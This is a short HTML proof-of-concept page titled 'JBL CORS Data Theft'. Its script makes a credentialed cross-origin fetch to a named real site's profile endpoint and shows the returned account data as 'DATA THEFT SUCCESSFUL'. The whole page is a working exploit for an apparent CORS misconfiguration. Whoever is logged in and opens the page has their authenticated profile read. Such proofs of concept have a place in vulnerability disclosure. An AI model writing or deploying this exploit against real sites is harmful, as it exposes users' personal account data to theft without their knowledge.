<!DOCTYPE html>
<html>
<head><title>JBL CORS PoC</title></head>
<body>
<h1>JBL CORS Data Theft</h1>
<p>Fetching profile data from <code>www.jbl.com/profile</code> with credentials...</p>
<pre id="result" style="background:#f5f5f5;padding:10px;"></pre>
<script>
(async () => {
    const resultEl = document.getElementById('result');
    try {
        const response = await fetch('https://www.jbl.com/profile', {
            credentials: 'include',
            mode: 'cors'
        });
        const text = await response.text();
        resultEl.innerHTML = `<strong>✅ DATA THEFT SUCCESSFUL!</strong>\n\nStolen data length: ${text.length} characters\n\nFirst 1500 characters:\n${text.substring(0, 1500)}`;
    } catch (err) {
        resultEl.innerHTML = `<strong>❌ Error:</strong> ${err.message}`;
    }
})();
</script>
</body>
</html>
